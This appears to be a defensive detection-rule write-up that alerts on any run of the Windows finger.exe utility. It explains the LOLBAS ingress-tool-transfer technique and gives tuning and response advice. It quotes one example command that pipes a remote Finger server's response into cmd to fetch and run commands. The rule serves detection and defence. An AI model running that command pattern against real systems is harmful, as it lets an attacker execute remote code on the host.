# LOLBAS Abuse - Finger.exe

**Severity:** High\
**MITRE ATT&CK:** T1105 (Ingress Tool Transfer)\
**Owner:** Jino

## Description

Detects any execution of finger.exe (c:\windows\system32\finger.exe or
c:\windows\syswow64\finger.exe). Finger is a legacy Windows utility for
querying user information from a remote Finger service — a protocol that
has been effectively dead since the 1990s and has no legitimate business
use on a modern endpoint. It is documented on LOLBAS as an ingress-tool-
transfer technique: an attacker can query a Finger server they control and
pipe the response (which can contain shellcode/commands) directly into
cmd, e.g.:

    finger user@example.host.com | more +2 | cmd

## Why this rule matches on presence alone, not a specific pattern

LOLBAS's own detection guidance for this binary is deliberately broad:
"finger.exe should not be run on a normal workstation" and "finger.exe
connecting to external resources" are both listed as sufficient IOCs on
their own. Unlike PowerShell or cmd.exe, there's essentially no common
legitimate reason for finger.exe to execute in a modern Windows environment,
so alerting on presence rather than a specific command-line pattern is
appropriate and low-noise.

## Source

https://lolbas-project.github.io/lolbas/Binaries/Finger/

## Tuning note

If you get a hit, pull the full command line and parent process — the
LOLBAS technique specifically involves piping finger's output into cmd, so
a parent/child relationship with cmd.exe shortly after is a strong
secondary confirmation this is the download-payload pattern rather than
some other unusual use.

## Response action

Alert and investigate. Given the near-total absence of legitimate use,
treat any hit as high-priority for review — this isn't a "common tool with
occasional bad behavior" like the remote-access tools, it's a binary that
essentially only shows up when something abusive is happening.